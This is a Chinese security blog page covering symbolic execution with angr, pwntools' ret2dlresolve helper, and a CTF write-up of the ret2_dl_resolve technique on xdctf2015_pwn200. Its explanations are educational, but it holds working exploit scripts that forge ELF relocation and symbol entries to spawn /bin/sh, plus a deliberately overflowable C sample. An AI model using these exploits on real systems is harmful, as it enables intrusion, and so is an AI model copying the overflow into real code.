<p>符号执行是指在不执行实际程序的前提下，把源程序翻译为一种中间语言，用符号值表示程序变量的值，然后基于中间语言模拟程序执行来进行相关分析的技术，它可以分析代码的所有语义信息，也可以只分析部分语义信息（如只分析“内存是否释放”这一部分的语义信息）。</p>
<p>程序的路径（path）是程序的一个语句序列，这个语句序列包括程序的一些顺序的代码片段，代码片段之间的连接是由于分支语句导致的控制转移。一个路径是可行的（feasible），是指存在程序输入变量的至少一组值，如果以这组值作为输入，程序将沿着这条路径执行。否则，路径就是不可行的（infeasible）。路径条件（path condition,PC）是针对一个路径的，它是一个关于程序输入变量的符号值的约束，一组输入值使得程序沿着这条路径执行当且仅当这组输入值满足这条路径的路径条件。</p>
</blockquote>
<p>例如某个程序在执行过程中会执行如下语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> password[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">char</span> *sneaky = <span class="string">&quot;SOSNEAKY&quot;</span>;</span><br><span class="line">read(<span class="number">0</span>, password, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>显然在这条 if 分支语句处程序的执行路径就可以分成两条，分别对应 strcmp 函数的比较结果。同时显然至少存在一组值（”SOSNEAKY“）能使得这条分支语句中存在可行路径。</p>
<h4 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h4><p><a target="_blank" rel="noopener" href="https://docs.angr.io/">官方手册</a></p>
<p>angr的作用就在于能够得出上述的使得程序走”可行路径“的”至少一组值“。</p>
<p>要注意的是符号执行的路径选择问题到现在依旧是一个很大的问题，换句话说也就是当我们的程序存在循环时，因为符号执行会尽量遍历所有的路径，所以每次循环之后会形成至少两个分支，当循环的次数足够多时，就会造成路径爆炸，整个机器的内存会被耗尽。</p>
<p>我们以下面的例子来学习如何使用angr</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/13/pwntools/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/13/pwntools/" class="post-title-link" itemprop="url">pwntools</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-13 16:46:52" itemprop="dateCreated datePublished" datetime="2022-02-13T16:46:52+08:00">2022-02-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-08 03:24:42" itemprop="dateModified" datetime="2022-03-08T03:24:42+08:00">2022-03-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="记录一下pwntools的模块"><a href="#记录一下pwntools的模块" class="headerlink" title="记录一下pwntools的模块"></a>记录一下pwntools的模块</h3><h4 id="pwnlib-rop-ret2dlresolve"><a href="#pwnlib-rop-ret2dlresolve" class="headerlink" title="pwnlib.rop.ret2dlresolve"></a><a target="_blank" rel="noopener" href="http://docs.pwntools.com/en/stable/rop/ret2dlresolve.html#module-pwnlib.rop.ret2dlresolve"><code>pwnlib.rop.ret2dlresolve</code></a></h4><p>自动化生成ret2dlresolve的payload，如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./binary&quot;</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"><span class="comment">#这里是要执行的函数及其参数</span></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">io = process(<span class="string">&quot;./binary&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload = flat(&#123;<span class="number">112</span>:raw_rop,<span class="number">256</span>:dlresolve.payload&#125;)</span><br><span class="line"><span class="comment">#这里的两个数字分别的padding的长度、输入函数的最大输入字节数</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>如以下示例程序中（32位），padding_length = 64+4、最大输入字节数 = 256</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/04/ret2_dl_resolve/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/04/ret2_dl_resolve/" class="post-title-link" itemprop="url">ret2_dl_resolve</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-04 04:39:18" itemprop="dateCreated datePublished" datetime="2022-02-04T04:39:18+08:00">2022-02-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-04 13:52:11" itemprop="dateModified" datetime="2022-03-04T13:52:11+08:00">2022-03-04</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这篇文章从<a target="_blank" rel="noopener" href="https://study.163.com/course/courseMain.htm?courseId=1212430806&_trace_c_p_k2_=5f25e3cfc98742df8494d8a0a8c8bc12">HWS计划2020安全精英夏令营</a>、[ctf wiki](<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#pwntools">ret2dlresolve - CTF Wiki (ctf-wiki.org)</a>)以及[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37572651">新手向]ret2dl-resolve详解 - 知乎 (zhihu.com)</a>中整理写出</p>
<ul>
<li><p>32位下</p>
<ul>
<li><p>ELF 程序的基本相关结构</p>
<ul>
<li><p>ELF 可执行文件由 ELF 头部，程序头部表和其对应的段，节区头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为 <strong>PT_DYNAMIC</strong> 的段，其包含 <strong>.dynamic</strong> 节区。结构如下（32位为例）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">	ELF32_Sword d_tag;</span><br><span class="line">	union&#123;</span><br><span class="line">		ELF32_Word	d_val;</span><br><span class="line">		ELF32_Addr	d_ptr;</span><br><span class="line">	&#125; d_un;</span><br><span class="line">&#125; ELF32_Dyn;</span><br></pre></td></tr></table></figure></li>
<li><p>节区中包含目标文件所有信息</p>
</li>
<li><p>如图，列出了某个文件的28个节区。其中类型为 REL 的节区包含重定位表项</p>
<img src="/2022/02/04/ret2_dl_resolve/readelf-1.jpg" class>

<img src="/2022/02/04/ret2_dl_resolve/readelf-2.jpg" class>

<ul>
<li><p>.dynamic 包含了很多动态链接所需的关键信息，我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针，可以<code>readelf -S hellopwn</code>看一下，会发现这三个section的地址跟在下图所示的地址是一样的。</p>
<img src="/2022/02/04/ret2_dl_resolve/dynamic.jpg" class></li>
<li><p>其中 .rel.plt 节是<strong>函数</strong>重定位表，也是一个结构体数组，每个项对应一个导入函数，结构体定义如下。.rel.dyn 节用于<strong>变量</strong>重定位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	ELF32_Addr r_offset;	<span class="comment">//对于可执行文件，此值为虚拟地址</span></span><br><span class="line">	ELF32_Word r_info;		<span class="comment">//符号表索引</span></span><br><span class="line">&#125; ELF32_Rel;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(i) ((i)&gt;&gt;8)		<span class="comment">//该宏定义将传进来的值右移8位（去掉低一字节）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(i) ((unsigned char)(i))	<span class="comment">//该宏定义取传进来的值的低一字节</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(s,t) (((s)&lt;&lt;8) + (unsigned char)(t))</span></span><br></pre></td></tr></table></figure>

<p>我们用 readelf -r 即可查看目标文件 REL 节区的相关信息</p>
<img src="/2022/02/04/ret2_dl_resolve/readelf-3.jpg" class>

<p>对于导入函数来说，其 r_info 的最低一字节都是 0x7</p>
</li>
<li><p>.got 节保存全局变量偏移表，.got.plt 节存储着全局函数偏移表。.got.plt 对应着 ELF32_Rel 结构中 r_offset 的值。例如上图中 REL 节区中的 write 函数，其 r_offset = 0x804a010，即其在got表中位于 0x804a010 </p>
<img src="/2022/02/04/ret2_dl_resolve/got.plt.jpg" class></li>
<li><p>.dynsym 节区包含了动态链接符号表（结构体数组）每个项同样对应一个导入函数。其中，ELF32_Sym[num]中的 num 对应着 <code>ELF32_R_SYM(ELF32_Rel-&gt;r_info)</code>。根据定义，<code>ELF32_R_SYM(ELF32_Rel-&gt;r_info) = ELF32_Rel-&gt;r_info &gt;&gt; 8</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name; <span class="comment">// 符号名，是相对.dynstr起始的偏移</span></span><br><span class="line">    Elf32_Addr st_value;</span><br><span class="line">    Elf32_Word st_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">    Elf32_Section st_shndx;</span><br><span class="line">&#125; Elf32_Sym; <span class="comment">//对于导入函数符号而言，未标注的字段都是0</span></span><br></pre></td></tr></table></figure>

<p>注意一个 ELF32_Sym 结构体的大小为 0x10 个字节</p>
<p>例如当程序想查找一个函数对应的 ELF32_Sym 结构体时，就会在取出其 ELF32_Rel-&gt;r_info 的值并用 ELF32_R_SYM() 操作（即右移8位），由此得出下标num。</p>
<p>例如上图中 REL 节区中的 write 函数，其 r_info = 0x507，<code>ELF32_R_SYM(ELF32_Rel-&gt;r_info) = 0x507 &gt;&gt; 8 = 5</code>，而 ELF32_Sym[5] 即保存着write的符号表信息。</p>
<p>用 readelf -s 就能查看 Sym 结构</p>
<img src="/2022/02/04/ret2_dl_resolve/readelf-4.png" class>

<p>并且 <code>ELF32_R_TYPE(0x507) = 7</code>，对应 <code>R_386_JUMP_SLOT</code></p>
</li>
<li><p>.dynstr 节包含了动态链接所需的字符串。这个节区以 \x00 作为开始和结束，中间每个字符串也以 \x00 间隔。相关数据结构引用一个字符串时，用的是<strong>相对这个section头的偏移</strong>，比方说，在这里，就是字符串相对0x804821C的偏移。</p>
<img src="/2022/02/04/ret2_dl_resolve/dynstr.jpg" class></li>
<li><p>.plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。</p>
<p>程序call一个函数的plt时，执行流如下（以write函数为例）：</p>
<p>call write@plt -&gt; 跳转至 0x80483c0 执行，该地址处有三条汇编代码，如下：</p>
<img src="/2022/02/04/ret2_dl_resolve/call_plt.png" class>

<p>而 0x804a010 处是write的got表的位置，在ELF采用延迟绑定技术时，程序还未执行过某个函数时，该函数的got表内存放的是该函数 plt+6 的地址，如下：</p>
<img src="/2022/02/04/ret2_dl_resolve/first_got.png" class>

<p>所以程序就相当于继续执行 0x80483c6 处的汇编，把 _dl_runtime_resolve() 的第二个参数 <strong>reloc_arg = 0x20</strong> 作为参数压栈，然后 <code>jmp 0x8048370</code>，该地址处的汇编代码如下：</p>
<img src="/2022/02/04/ret2_dl_resolve/call_dl_resolve.jpg" class>

<p>0x8048370 再把 *<em>link_map = <em>(GOT+4)</em></em> 压栈（整个got表+4的位置，这个位置是一个link_map的指针，是在程序加载的时候就写入的。link map这个结构我们不关心，但是要知道它包含了<code>.dynamic</code>的指针，通过这个<code>link_map</code>，<code>_dl_runtime_resolve</code>函数可以访问到<code>.dynamic</code>这个section）</p>
<img src="/2022/02/04/ret2_dl_resolve/GOT+4.jpg" class>

<p>而 *(GOT+8) 中保存的是 _dl_runtime_resolve() 函数的地址，由此就相当于执行了 <code>_dl_runtime_reslove(link_map,reloc_arc)</code>，由该函数完成符号的解析，将write函数的真实地址写入其got表中，随后把控制权交给write函数</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>其中 _dl_runtime_resolve() 是在 glibc-2.22/sysdeps/i386/dl-trampoline.S 中用汇编实现的，其代码如下</p>
<img src="/2022/02/04/ret2_dl_resolve/dl_resolve_ass.png" class>

<p>0xf7fee00b 处即调用 <code>_dl_fixup</code>，并且通过寄存器传参。<code>_dl_fixup</code>是在 glibc-2.22/elf/dl_runtime.c 实现的，我们只需要关注一些主要函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l, ELFW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>首先通过参数 reloc_arg 计算重定位入口，这里的<code>JMPREL</code>即<code>.rel.plt</code>，<code>reloc_offset</code>即<code>reloc_arg</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l,l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure>

<p>所以由此得出的 reloc 就是该函数在 .rel.plt 节所对应的结构体</p>
</li>
<li><p>然后通过 reloc-&gt;r_info 找到 .dynsym 中对应的条目</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ELFW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM)(reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>

<p>其中 symtab[] 就是 .dynsym 中的结构体数组，由 <code>ELFW(R_SYM)(reloc-&gt;r_info)</code> 该步操作得出其下标（<code>ELFW(R_SYM)(i)</code>是前面讲过的宏定义），最后取地址赋值给指针 sym，该操作在介绍 .dynsym 节的内容时已经讲过</p>
<p>这里还会检查 reloc-&gt;r_info 的最低位是不是等于 <code>R_386_JUMP_SLOT</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure></li>
<li><p>接着通过 strtab + sym-&gt;st_name 找到符号表字符串，result为libc基址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name,l,&amp;sym,l-&gt;l_scope,version,ELF_RTYPE_CLASS_PLT,flags,NULL);</span><br></pre></td></tr></table></figure></li>
<li><p>value为libc基址加上要解析的函数的偏移地址，由此得到实际地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (result,sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br></pre></td></tr></table></figure>

<p>由此步我们得知其实最后决定value的值的是函数经过前面层层步骤最后得到的函数名字的字符串，函数会用得到的要解析的函数名称的字符串去表里寻找，从而匹配得到要解析的函数的真实地址。</p>
</li>
<li><p>最后把value写入相应的got表条目中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return elf_machine_fixup_plt (l,result,reloc.rel_addr,value);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>漏洞利用流程</p>
<ol>
<li>控制 EIP 为 PLT[0] 的地址，只需要传递一个 reloc_arg 参数</li>
<li>控制 reloc_arg 的大小，使 reloc 的位置落在可控地址内</li>
<li>伪造 reloc 的内容，使 sym 落在可控地址内</li>
<li>伪造 sym 的内容，使 name 落在可控地址内</li>
<li>伪造 name 为任意库函数名称，如 system</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><p>以这道经典例题为例一步步理解漏洞的利用流程</p>
<p>程序保护如下</p>
<img src="/2022/02/04/ret2_dl_resolve/pwn200-checksec.jpg" class>

<p>RELRO没有全开是ret2_dl_resolve所必须的条件之一</p>
<p>main函数如下</p>
<img src="/2022/02/04/ret2_dl_resolve/pwn200-main.png" class>

<p>vuln函数如下</p>
<img src="/2022/02/04/ret2_dl_resolve/pwn200-vuln.jpg" class>

<p>漏洞只是一个栈溢出，接下来我们尝试一步一步完成ret2_dl_resolve的攻击流程</p>
<h5 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h5><p>我们将栈迁移到 .bss 段，然后尝试用伪造的 Rel 结构体来让 _dl_runtime_resolve 函数成功解析，这部分的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_ebp = <span class="number">0x0804862b</span></span><br><span class="line">p3_ret = <span class="number">0x08048629</span></span><br><span class="line">leave_ret = <span class="number">0x0804851A</span></span><br><span class="line">binsh = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">base_stage = bss_addr + <span class="number">0x800</span></span><br><span class="line">binsh_addr = base_stage + <span class="number">80</span></span><br><span class="line">plt0 = <span class="number">0x08048370</span></span><br><span class="line"></span><br><span class="line">rel_plt = <span class="number">0x08048324</span></span><br><span class="line">r_info = <span class="number">0x607</span></span><br><span class="line">fake_rel = p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(r_info)</span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span> <span class="comment">#28是fake_rel在base_stage中的偏移</span></span><br><span class="line">reloc_arg = fake_rel_addr - rel_plt</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span> + p32(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(p3_ret) + p32(<span class="number">0</span>) + p32(base_stage) + p32(<span class="number">0x100</span>) + p32(pop_ebp) + p32(base_stage) + p32(leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(plt0)</span><br><span class="line">payload += p32(reloc_arg)</span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(binsh))</span><br><span class="line"><span class="comment">#fake_rel</span></span><br><span class="line">payload += fake_rel</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += binsh</span><br><span class="line">payload = payload.ljust(<span class="number">100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<img src="/2022/02/04/ret2_dl_resolve/pwn200-task1.jpg" class>

<p>可见我们伪造的 Rel 结构体同样能让程序成功解析并输出’/bin/sh’字符串，其中exp中的所需信息用 <code>readelf</code> 去找即可。</p>
<h5 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h5><p>在上一阶段中我们伪造的 Rel 结构体与write函数原本的 Rel 结构体完全相同。接下来尝试更改伪造的 r_info 使得程序用我们伪造的 Sym 结构体去寻找我们控制的 st_name。</p>
<p>我们先查看write函数原本对应的 Sym 结构体是怎样的，我们查看了write函数的 r_info = 0x607，<code>0x607 &gt;&gt; 8 = 0x6 </code>，所以write函数对应的 Sym 结构体是 .dynsym 节的第七个，因为一个 ELF32_Sym 结构体的大小为 0x10 个字节，所以也可以算出其地址为 <code>dynsym_addr + (0x607&gt;&gt;8)*0x10</code>，我们再查看 .dynsym 节</p>
<img src="/2022/02/04/ret2_dl_resolve/pwn200-task2.png" class>

<p>由此我们得知了write函数所对应的 st_name = 0x4c</p>
<p>这部分exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">r_info = ((fake_sym_addr - dynsym)/<span class="number">0x10</span>&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_rel = p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(r_info)</span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span></span><br><span class="line">reloc_arg = fake_rel_addr - rel_plt</span><br><span class="line"></span><br><span class="line">st_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span> + p32(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(p3_ret) + p32(<span class="number">0</span>) + p32(base_stage) + p32(<span class="number">0x100</span>) + p32(pop_ebp) + p32(base_stage) + p32(leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(plt0)</span><br><span class="line">payload += p32(reloc_arg)</span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(binsh))</span><br><span class="line"><span class="comment">#fake_rel</span></span><br><span class="line">payload += fake_rel</span><br><span class="line"><span class="comment">#fake_sym</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*align</span><br><span class="line">payload += fake_sym</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += binsh</span><br><span class="line">payload = payload.ljust(<span class="number">100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>因为 Sym 结构体是根据 <code>&amp;symtab[ELFW(R_SYM)(reloc-&gt;r_info)]</code> 这样去找的，也就相当于 <code>dynsym + (reloc-&gt;r_info &gt;&gt; 8)*0x10</code> ，所以每个 Sym 结构体跟 .dynsym 节的起始地址的偏移都是按 0x10 个字节对齐的，即 <code>(fake_sym_addr - dynsym)%0x10 == 0</code> ，所以只要让 <code>(fake_sym_addr - dynsym)&amp;0xf + x = 0x10</code> 即可，这个 x 就是exp中作padding的align。</p>
<p>同理，做个简单的逆运算即可得出 <code>r_info = ((fake_sym_addr - dynsym)/0x10 &lt;&lt; 8</code>，因为先左移了8位，所以直接 <code>|0x7</code> 来确保 r_info 的最低一字节是 0x7（知识点中说过会有一个检查）</p>
<img src="/2022/02/04/ret2_dl_resolve/pwn200-task3.jpg" class>

<p>可见用我们伪造的 Sym 结构体同样能让 _dl_runtime_resolve 函数完成解析，输出我们的’/bin/sh’</p>
